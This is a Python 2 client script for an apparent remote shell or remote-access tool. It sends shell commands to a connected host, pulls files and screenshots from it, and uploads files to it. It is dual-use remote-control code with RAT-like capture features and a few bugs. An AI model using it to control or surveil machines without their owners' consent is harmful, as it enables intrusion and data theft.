import socket
import select
from threading import *
import getopt
import sys
import pyttsx
import os
from gc import collect
from collections import defaultdict
from getpass import getpass

screenLock = Semaphore(value=1)

ext = ''
didic = {}
didic = defaultdict(lambda: './', didic)

def toint(s):
	l = len(s)
	som = 0
	x = 0
	for i in range(l-1,-1,-1):
		som = som + (ord(s[i])-48)*pow(10,x)
		x = x + 1
	return int(som)

def file_download(client):	
	global ext
	client.send('OK')
	s = client.recv(1024)
	size = toint(s)
	response = raw_input("File size is "+str(size/1024)+"KB, do you want to continue the download? ")
	if "Yes" in response:
		name = raw_input("Give the name of the file: ")
		cou = 0
		client.send('OK-2\0')
		with open("/root/Desktop/files/"+name+"."+ext,"wb") as f :
			while cou<size-1:
				cou = cou + 1
				data = client.recv(1)
				f.write(data)

# def file_download(client,name,num):
# 	client.send('OK')
# 	s = client.recv(1024)
# 	size = toint(s)
# 	cou = 0
# 	client.send('OK-2\0')
# 	with open("/root/Desktop/tempserver/"+name+str(num),"wb") as f :
# 		while cou<size-1:
# 			cou = cou + 1
# 			data = client.recv(1)
# 			f.write(data)
# 	return "/root/Desktop/tempserver/"+name+str(num)

def file_upload(client,path):
	client.send("[+] Ready for Upload!")
	response = client.recv(1024)
	if "OK" in response:
		with open(path,"rb") as f:
			f.readlines()	
			sz = f.tell()
		client.send(str(sz))
		response = client.recv(1024)
		cou = 0
		with open(path,"rb") as f:
			while 1:
				cou+=1
				buff = f.read(1)
				if cou == sz:
					break
				client.send(buff)
		print "[+] Upload finished!"

def rec(ns):
	msg = ""
	while 1:
		buff = ns.recv(1024)
		if len(buff) < 1024:
			msg += buff
			break
		msg += buff
	screenLock.acquire()
	if 'Ready' in msg:
		# print 'YES'
		file_download(ns)
	else:
		print msg,
	screenLock.release()

def sen(ns,flag_x=0):
	global ext
	global di 
	flag = 1
	if flag_x:
		msg = getpass("<SH> #:")
	else:
		msg = raw_input("<SH> #:")
	screenLock.acquire()
	if "GET" in msg:
		ext = msg.split('.')[-1]
	elif "exit" in msg:
		ns.close()
		sys.exit(0)
	elif "Screenshot" in msg:
		ext = 'png'
	elif "UP" in msg:
		ns.send(msg)
		flag = 0
		file_upload(ns,msg.split('*$:')[	2])
	elif "cd" in msg:
		didic[msg.split('*$:')[0]] += msg.split(' ')[-1].strip()
	elif "ls" in msg:
		l = len(msg.split(' '))
		msg1 = msg
		msg = ""
		for i in xrange(0,l-1):
			msg += msg1.split(' ')[i]+" "
		msg += didic[msg.split('*$:')[0]]+msg1.split(' ')[-1].strip()
	if flag:
		ns.send(msg)
	screenLock.release()

def Main():
	global msg
	port = 0	
	host = '0.0.0.0'	

	if not len(sys.argv[1:]):
		sys.exit(0)
	try:
		opts,args = getopt.getopt(sys.argv[1:],"h:p:",["host","port"])
	except:
		usage()
		sys.exit(0)
	for o,a in opts:
		if o in ("-p","--port")  :
			port = int(a)
		elif o in ("-h","--host")  :
			host = a

	server=(host,port)
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(server)
	print s.recv(1024)
	for i in xrange(0,2):
		sen(s,1)
		rec(s)
	os.system('clear')
	while 1:
		sen(s)
		rec(s)
		msg = ""
		if "exit" in msg:
			break
		collect()
	s.close()
if __name__=='__main__':
	Main()